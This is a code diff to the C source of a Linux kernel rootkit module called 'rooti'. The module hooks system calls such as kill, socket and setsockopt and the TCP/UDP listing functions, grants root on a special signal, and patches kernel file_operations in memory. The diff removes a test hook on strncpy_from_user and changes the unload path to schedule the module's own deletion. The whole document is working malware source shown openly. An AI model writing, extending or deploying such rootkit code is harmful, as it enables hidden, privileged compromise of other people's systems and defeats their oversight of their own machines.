@@ -68,10 +68,6 @@ static ssize_t (*orig_urandom_read_iter)(struct kiocb *kiocb, struct iov_iter *i
 static int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 static int (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
 
-// Reference to other kernel functions that are hooked
-static long (*orig_strncpy_from_user)(char *dst, const char __user *src, long count);
-
-
 static asmlinkage long hook_kill(const struct pt_regs *regs)
 {
     int sig = regs->si;
@@ -81,9 +77,8 @@ static asmlinkage long hook_kill(const struct pt_regs *regs)
         return rooti_elevate_privilege();
     } 
     else if (sig == ROOTI_SIG_UNLOAD) {
-        // Unload the rootkit
-        rooti_self_destruct();
-        return 0;
+        // Schedule the unloading of the rootkit
+        return rooti_schedule_self_deletion();
     }
     return orig_kill(regs);
 }
@@ -324,18 +319,6 @@ static ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter)
     return len;
 }
 
-/*
-    This hook allows passing kernel space addresses to strncpy_from_user().
-    The reason this is needed is so we can call system call service routines directly from within
-    the kernel itself and avoid a panic whenever we pass a pointer to a kernel buffer to the service routine.
-    Hooks for copy_to_user() and copy_from_user() are currently not needed but may be in the future.
-*/
-static long hook_strncpy_from_user(char *dst, const char __user *src, long count)
-{
-    ROOTI_DEBUG("strncpy_from_user called - addr is %lx", (unsigned long)src);
-    return orig_strncpy_from_user(dst, src, count);
-}
-
 // List of system calls to hook :D
 struct rooti_func_hook func_hooks[] = {
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_kill"), hook_kill, &orig_kill),
@@ -349,8 +332,6 @@ struct rooti_func_hook func_hooks[] = {
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_socket"), hook_socket, &orig_socket),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_setsockopt"), hook_setsockopt, &orig_setsockopt)
 };
-
-struct rooti_func_hook test_hook = ROOTI_FUNC_HOOK("strncpy_from_user", hook_strncpy_from_user, &orig_strncpy_from_user);
 
 /* LKM initialization */
 static int __init rooti_init(void)
@@ -370,9 +351,6 @@ static int __init rooti_init(void)
         ROOTI_DEBUG("rooti_install_hooks() failed: %d", ret);
         return ret;
     }
-
-    test_hook.addr = __kallsyms_lookup_name(test_hook.name);
-    rooti_install_inline_hook(&test_hook);
 
     // Patch some operation structures function pointers. You could just hook the callbacks
     // themselves but I wanted to try patching kernel objects directly in memory.
@@ -415,8 +393,6 @@ static void __exit rooti_exit(void)
     ROOTI_DEBUG("exit");
 
     rooti_uninstall_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
-
-    rooti_uninstall_inline_hook(&test_hook);
 
     // Restore kernel structures to their original form
     struct file_operations *random_file_ops = (struct file_operations *)__kallsyms_lookup_name("random_fops");
